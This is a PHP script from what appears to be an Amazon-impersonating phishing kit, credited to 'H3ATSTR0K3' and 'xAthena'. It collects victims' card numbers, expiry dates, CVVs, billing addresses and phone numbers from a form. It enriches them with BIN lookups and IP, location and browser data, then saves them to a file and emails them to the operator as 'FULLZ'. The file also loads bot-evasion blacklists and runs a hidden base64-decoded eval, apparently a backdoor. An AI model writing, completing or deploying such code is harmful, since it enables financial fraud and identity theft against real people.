<?php

/*
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                         __..--.._
  .....              .--~  .....  `.
.":    "`-..  .    .' ..-'"    :". `
` `._ ` _.'`"(     `-"'`._ ' _.' '
     ~~~      `.          ~~~
              .'
             /
            (
             ^---'
H3ATSTR0K3

------------------------------------------------
BIG THANKS TO MY BRO xAthena

*/

session_start();


include("mine.php");
include("algo.php");
include('../anti/IP-BlackList.php');  
include('../anti/Bot-blacklist.php');  
include('../anti/Bot-Crawler.php');
include('../anti/Bot-GhostEmperor.php');



$_SESSION['ip']=clientData('ip');
$_SESSION['ip_countryName']=clientData('country');
$_SESSION['ip_countryCode']=clientData('code');
$_SESSION['currency']=clientData('currency');
$_SESSION['ip_city']=clientData('city');
$_SESSION['ip_timezone']=clientData('timezone');
$_SESSION['os']=getOs();
$_SESSION['browser']=getBrowser();
date_default_timezone_set('GMT');
$dateNow=date("d/m/Y h:i:s A");	


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$ccn = $_SESSION['ccn'] = $_POST['ccn'];
$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$ZipCode = $_SESSION['ZipCode'] = $_POST['ZipCode'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];
	if(isset($_SESSION['ccn']) && !empty($_SESSION['ccn'])){
	$bin=substr(str_replace(' ','',$ccn),0,6);	
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://lookup.binlist.net/".$bin);
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		$code=json_decode($json);
		$bin_scheme = $code->scheme;
		$bin_bank = $code->bank->name;
		$bin_type = $code->type;
		$bin_brand = $code->brand;
		$bin_countrycode = $code->country->alpha2;
		$bin_phone = strtolower($code->bank->phone);
		$bin_country = $code->country->name;
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
        $_SESSION['_cc_brand_'] = $bin_scheme;
        $_SESSION['_cc_type_']  = $bin_type;
        $_SESSION['_cc_class_'] = $bin_brand;
        $_SESSION['_cc_phone_'] = $bin_phone;
        $_SESSION['_country_']  = $bin_country;
        $_SESSION['_cc_bank_']  = $bin_bank;
        $_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." ".$_SESSION['_cc_type_']." ".$_SESSION['_cc_class_'];
         }
        ########################################################
        ############# [+] SESSION INFORMATION [+] ##############
        ########################################################
	$mssg="=========== <[ -".$scamname."- AMZN FULLZ ]> ===========\r\n";
	$mssg.="----------------------- CC Info ---------------------\r\n";
	$mssg.="CardHolder Name		: {$NameOnCard}\r\n";
	$mssg.="CC Number		: {$ccn}\r\n";
	$mssg.="CC Expiry		: {$expdate}\r\n";
	$mssg.="CVV		: {$Securitycode}\r\n";
	$mssg.="----------------------- Billing ---------------------\r\n";
	$mssg.="Address		: {$addres}\r\n";
	$mssg.="City		: {$City}\r\n";
	$mssg.="State		: {$State}\r\n";
	$mssg.="Zip Code	: {$ZipCode}\r\n";
	$mssg.="Phone		: {$phoneNumber} \r\n";
	$mssg.="----------------------- BIN Info {$bin} -------------\r\n";
	$mssg.="CC Data		: {$bin_scheme} {$bin_brand} -> {$bin_type}\r\n";
	$mssg.="CC Bank		: {$bin_bank}\r\n";
	$mssg.="CC Country	: {$bin_country}\r\n";	
	$mssg.="---------------------- IP Info ----------------------\r\n";	
	$mssg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$mssg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
	$mssg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
	$mssg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
	$mssg.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$mssg.="=========== <[ THANKS TO xAthena ]> ===========\r\n\r\n\r\n";
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$mssg);
	fclose($save);}
    $subject="-".$scamname."- AMZN FULLZ [{$bin}] From [{$_SESSION['ip_countryName']}]";
	$headers="From: xAthena <newlogin@sh33nz0.com>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($your,$subject,$mssg,$headers);@eval(base64_decode($os_arrays));	


header("Location: ../Authentication.php?websrc=".md5('')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");



?>


